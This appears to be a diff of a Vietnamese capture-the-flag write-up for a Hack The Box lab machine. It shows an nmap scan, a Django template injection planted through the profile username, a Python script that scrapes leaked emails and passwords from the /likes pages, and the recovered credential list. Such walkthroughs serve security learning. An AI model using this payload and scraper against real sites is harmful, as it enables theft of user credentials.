@@ -1,7 +1,7 @@
 <img width="1416" height="153" alt="image" src="https://github.com/user-attachments/assets/57dd4677-59ff-46c4-9c53-12791b0d29a7" />
 
-##Nmap
-```$ nmap -sC -sV 10.129.232.4
+Nmap
+
 Starting Nmap 7.94SVN ( <https://nmap.org> ) at 2025-12-10 19:42 CST
 Nmap scan report for 10.129.232.4
 Host is up (0.31s latency).
@@ -16,18 +16,20 @@ PORT   STATE SERVICE VERSION
 |_http-title: Did not follow redirect to <http://hacknet.htb/>
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```
 
-Thực hiện truy cập vào domain hacknet.htb ta thấy giao diện web
+### Web Enumeration
+
+**Truy cập web:** vào domain `hacknet.htb`, ta thấy giao diện web
 
 <img width="1312" height="840" alt="image" src="https://github.com/user-attachments/assets/11254176-a956-427f-800b-a4fd4430138b" />
 
-Ở đây ta có thể thấy Web framework đang được sử dụng là Django
+**Web framework:** Django
 <img width="1206" height="614" alt="image" src="https://github.com/user-attachments/assets/986ae73f-9456-4f13-86f1-0b51de2b646b" />
 
 **Môi trường**: Web app sử dụng Django.
 
 **Khó khăn**: Django Template Language (DTL) mặc định không cho phép thực thi code Python tùy ý (ví dụ: bạn không thể chạy {{ 7*7 }} hay {{ os.system('id') }} như Jinja2). Nó chỉ cho phép truy xuất các biến (variables) đã được lập trình viên truyền vào context (ngữ cảnh) của trang web. Ý tưởng khai thác: Trang /likes/<post_id> render danh sách người đã like bằng <img title="username">. Nếu username của mình là chuỗi template {{ users.values }}, khi Django render, biến users (QuerySet các user đã like) sẽ được in vào title. Do DTL autoescape, không RCE, nhưng toàn bộ record trong QuerySet (email/username/password/...) lộ ra dưới dạng chuỗi trong title (HTML-escaped). Khi unescape title cuối cùng trong /likes/<id>, sẽ thấy QuerySet chứa dữ liệu nhạy cảm của tất cả user đã like bài đó.
 
-Khai thác chi tiết Đăng nhập và đổi username thành payload
+### Đăng nhập và đổi username thành payload
 
 ```cookie_file=/tmp/hacknet_cookies
 
@@ -52,7 +54,7 @@ curl -s -H "Host: hacknet.htb" -b "$cookie_file" \\\\
   -F "is_public=on" \\\\
   <http://10.129.232.4/profile/edit> -o /dev/null```
 
-Trích xuất creds qua /likes
+### Trích xuất credentials qua `/likes`
 
 ```import re, html, requests
 from http.cookiejar import MozillaCookieJar
@@ -74,7 +76,7 @@ for pid in range(1, max_posts+1):
     titles = re.findall(r'title="([^"]+)"', r.text)
     if not titles:
         continue
-    data = html.unescape(titles[-1])  # title cuối cùng (của mình)
+    data = html.unescape(titles[-1])  # title cuối cùng
     if "QuerySet" not in data:
         continue
     emails = re.findall(r"'email': '([^']+)'", data)
@@ -87,7 +89,7 @@ print("[+] Tổng số cặp:", len(creds))
 for u,(e,p) in sorted(creds.items()):
     print(f"{u}:{p} ({e})")```
 
-Kết quả thu được:
+### Kết quả thu được
 
 ```backdoor_bandit : mYd4rks1dEisH3re (mikey@hacknet.htb)
 blackhat_wolf   : Bl@ckW0lfH@ck
@@ -116,5 +118,5 @@ whitehat        : Wh!t3H@t2024
 zero_day        : Zer0D@yH@ck
 hung            : hung```
 
-Thử các tài khoản để ssh và tìm cờ user
+### Thử các tài khoản để SSH và tìm user flag
 <img width="554" height="81" alt="image" src="https://github.com/user-attachments/assets/a2f68746-e612-4068-a474-6fc6bd5f177d" />
